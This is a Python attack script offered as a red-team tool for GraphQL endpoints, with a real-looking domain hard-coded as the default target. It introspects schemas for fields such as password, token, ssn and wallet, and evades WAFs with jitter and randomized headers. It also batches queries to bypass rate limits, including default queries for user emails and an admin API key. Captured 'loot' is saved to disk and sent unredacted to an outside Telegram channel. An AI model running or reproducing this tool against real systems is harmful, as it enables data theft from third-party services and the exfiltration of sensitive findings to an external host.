#!/usr/bin/env python3
"""
GRAPHQL_INTROSPECTOR.PY v8.6 — Advanced GraphQL Schema Introspection & Query Batching Fuzzer (Elite Red Team Adversarial Edition)
Features:
- Automated full GraphQL schema introspection querying (__schema, types, fields, directives) with SHA-256 hashing
- Behavioral jitter and randomized header injection via SecureTransport / behavioral_mimic
- Query batching rate-limit bypass engine (aggregates multiple queries into a single HTTP POST array)
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
"""
import json
import sys
import asyncio
import hashlib
from modules.transport import SecureTransport
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message, color=COLORS['RESET']):
    sys.stdout.write(f"{color}{message}{COLORS['RESET']}\n")
    sys.stdout.flush()

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          description
          type { name kind ofType { name kind } }
        }
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

class GraphQLIntrospector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.transport = SecureTransport(target_url)

    def run_introspection(self, graphql_endpoint="/graphql"):
        terminal(f"\n[***] INITIATING GRAPHQL SCHEMA INTROSPECTION [{self.target_url}{graphql_endpoint}] (WAF Hardened) [***]", COLORS['MAGENTA'])
        
        # Apply behavioral jitter to evade WAF behavioral fingerprinting
        apply_behavioral_jitter()
        
        # Inject randomized headers and client hints
        random_headers = get_randomized_hints()
        random_headers["Content-Type"] = "application/json"

        payload = {"query": INTROSPECTION_QUERY}
        
        try:
            status, headers, body = self.transport.request(
                "POST", 
                graphql_endpoint, 
                payload=payload, 
                extra_headers=random_headers
            )
        except Exception as exc:
            terminal(f"[-] Transport request failed: {exc}", COLORS['RED'])
            return None

        if status not in [200, 201]:
            terminal(f"[-] GraphQL introspection endpoint returned HTTP {status}", COLORS['RED'])
            return None

        try:
            data = json.loads(body)
        except Exception as e:
            terminal(f"[-] Failed to parse GraphQL JSON response: {e}", COLORS['RED'])
            return None

        if "errors" in data and not data.get("data"):
            terminal(f"[-] GraphQL introspection disabled or rejected by server: {data['errors']}", COLORS['YELLOW'])
            return None

        schema_data = data.get("data", {}).get("__schema", {})
        types = schema_data.get("types", [])

        terminal(f"[+] GraphQL Schema Introspected Successfully! Total Types Discovered: {len(types)}", COLORS['GREEN'])

        sensitive_fields_found = []
        exposed_mutations = []

        for t in types:
            t_name = t.get("name", "")
            if t_name.startswith("__"):
                continue
            
            if t.get("kind") == "OBJECT":
                fields = t.get("fields") or []
                for f in fields:
                    f_name = f.get("name", "").lower()
                    if any(s in f_name for s in ["password", "token", "secret", "private", "ssn", "credit", "admin", "wallet"]):
                        sensitive_fields_found.append(f"{t_name}.{f['name']}")

            if t_name.lower() in ["mutation", "rootmutation"] and t.get("fields"):
                for m in t.get("fields", []):
                    exposed_mutations.append(m.get("name"))

        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()

        findings = {
            "endpoint": graphql_endpoint,
            "total_types": len(types),
            "sensitive_fields": sensitive_fields_found,
            "exposed_mutations": exposed_mutations,
            "integrity_hash": loot_hash,
            "schema_sample": body[:1000]
        }

        if sensitive_fields_found:
            terminal(f"[***] CRITICAL: Found {len(sensitive_fields_found)} sensitive fields in GraphQL schema!", COLORS['RED'])
            for sf in sensitive_fields_found[:10]:
                terminal(f"  └── {sf}", COLORS['YELLOW'])

        # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
        stream_proof(
            "GRAPHQL_INTROSPECTION_SUCCESS",
            graphql_endpoint,
            {"query": "__schema", "hash": loot_hash},
            body[:500],
            findings
        )

        save_session_loot(
            target=self.target_url,
            endpoint=graphql_endpoint,
            finding_type="GRAPHQL_INTROSPECTION_SUCCESS",
            status=status,
            headers=headers,
            body=body,
            extra_loot=findings
        )

        broadcast_tg_alert_sync("GraphQL Introspection Confirmed", findings)
        return findings

    def run_batching_attack(self, graphql_endpoint="/graphql", queries=None):
        """
        Executes a GraphQL Query Batching attack to bypass per-request rate limits 
        by bundling multiple queries into a single HTTP POST array.
        """
        terminal(f"\n[***] INITIATING GRAPHQL QUERY BATCHING ATTACK [{self.target_url}{graphql_endpoint}] [***]", COLORS['MAGENTA'])
        apply_behavioral_jitter()

        if not queries:
            queries = [
                {"query": "{ __typename }"},
                {"query": "{ users { id email } }"},
                {"query": "{ adminSettings { apiKey } }"}
            ]

        random_headers = get_randomized_hints()
        random_headers["Content-Type"] = "application/json"

        try:
            status, headers, body = self.transport.request(
                "POST",
                graphql_endpoint,
                payload=queries,
                extra_headers=random_headers
            )

            if status in [200, 201] and body:
                terminal(f"[+] Query batching assault successful [HTTP {status}]", COLORS['GREEN'])
                terminal(f"  └── Batch Response Preview: {body[:300]}", COLORS['CYAN'])

                loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                loot_data = {
                    "endpoint": graphql_endpoint,
                    "batch_size": len(queries),
                    "status": status,
                    "integrity_hash": loot_hash,
                    "response_sample": body[:800]
                }

                # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                stream_proof("GRAPHQL_BATCHING_SUCCESS", graphql_endpoint, {"batch_size": len(queries), "hash": loot_hash}, body[:300], loot_data)
                save_session_loot(
                    target=self.target_url,
                    endpoint=graphql_endpoint,
                    finding_type="GRAPHQL_BATCHING_SUCCESS",
                    status=status,
                    headers=headers,
                    body=body,
                    extra_loot=loot_data
                )

                broadcast_tg_alert_sync("GraphQL Query Batching Success", loot_data)
                return loot_data
            else:
                terminal(f"[-] Batching request returned HTTP {status} or batching is disabled.", COLORS['YELLOW'])
        except Exception as exc:
            terminal(f"[-] Batching attack error: {exc}", COLORS['RED'])

        return None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobyte.online"
    inspector = GraphQLIntrospector(target)
    inspector.run_introspection("/graphql")
    inspector.run_batching_attack("/graphql")
